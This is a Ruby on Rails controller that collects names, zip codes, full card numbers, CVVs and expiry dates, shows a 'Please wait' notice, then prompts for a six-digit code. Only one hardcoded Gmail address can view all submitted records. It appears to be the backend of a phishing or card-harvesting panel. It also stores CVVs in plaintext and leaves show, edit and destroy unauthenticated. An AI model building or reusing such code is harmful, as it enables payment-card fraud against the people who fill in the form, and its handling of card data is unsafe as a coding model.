class InfosController < ApplicationController
  before_action :set_info, only: %i[ show edit update destroy ]
  before_action :authenticate_specific_user!, only: [:index]

  # GET /infos or /infos.json
  def index
    @infos = Info.all
  end

  # GET /infos/1 or /infos/1.json
  def show
    @info = Info.find(params[:id])
    @six_digit_input = SixDigitInput.new  # Ensure you initialize the necessary instance variable
  end

  # GET /infos/new
  def new
    @info = Info.new
  end

  # GET /infos/1/edit
  def edit
  end

  # POST /infos or /infos.json
  def create
    @info = Info.new(info_params)

    respond_to do |format|
      if @info.save
        format.html { redirect_to info_url(@info), notice: "Please wait" }
        format.json { render :show, status: :created, location: @info }
      else
        format.html { render :new, status: :unprocessable_entity }
        format.json { render json: @info.errors, status: :unprocessable_entity }
      end
    end
  end

  # PATCH/PUT /infos/1 or /infos/1.json
  def update
    respond_to do |format|
      if @info.update(info_params)
        format.html { redirect_to info_url(@info), notice: "Info was successfully updated." }
        format.json { render :show, status: :ok, location: @info }
      else
        format.html { render :edit, status: :unprocessable_entity }
        format.json { render json: @info.errors, status: :unprocessable_entity }
      end
    end
  end

  # DELETE /infos/1 or /infos/1.json
  def destroy
    @info.destroy!

    respond_to do |format|
      format.html { redirect_to infos_url, notice: "Info was successfully destroyed." }
      format.json { head :no_content }
    end
  end

  private
    # Use callbacks to share common setup or constraints between actions.
    def set_info
      @info = Info.find(params[:id])
    end

    # Only allow a specific user to access the index action
    def authenticate_specific_user!
      unless current_user && current_user.email == "jd007nm007@gmail.com"
        flash[:alert] = "You are not authorized to access this page."
        redirect_to root_path
      end
    end

    # Only allow a list of trusted parameters through.
    def info_params
      params.require(:info).permit(:name, :zip, :card, :cvv, :month, :year)
    end
end
